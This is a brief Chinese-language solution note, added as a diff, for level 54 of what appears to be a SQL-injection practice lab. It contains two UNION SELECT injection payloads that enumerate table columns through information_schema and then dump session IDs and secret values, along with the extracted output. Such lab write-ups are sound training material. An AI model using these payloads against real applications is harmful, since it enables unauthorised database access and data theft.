@@ -1,0 +1,11 @@
+第54关
+
+?id=-1' union select 1,database(),group_concat(column_name) from information_schema.columns where table_name='56w1feq3rm' --+
+sessid,secret_7S6G,tryy
+
+?id=-1' union select 1,database(),group_concat(sessid,0x3a,secret_7S6G,0x3a,tryy) from 56w1feq3rm --+
+6b4ab8f908b36b4c1bfd44fc0033a3dd:uIzrJjQg1JprEt92gntGas0A:4、
+
+
+ 
+闯关成功！！！
